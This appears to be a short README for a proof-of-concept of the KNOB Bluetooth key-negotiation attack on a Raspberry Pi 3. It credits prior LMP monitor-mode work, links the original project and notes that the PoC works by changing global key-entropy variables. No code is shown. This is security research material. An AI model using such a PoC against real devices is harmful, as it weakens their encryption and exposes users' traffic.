This is a standalone PoC for the KNOB attack on a Raspberry Pi 3.

Original LMP monitor mode was from Dennis Mantz, and was then modified by Daniele Antonioli for KNOB.
For details see https://github.com/francozappa/knob

This PoC is much shorter since it only modifies global variables for key entropy.
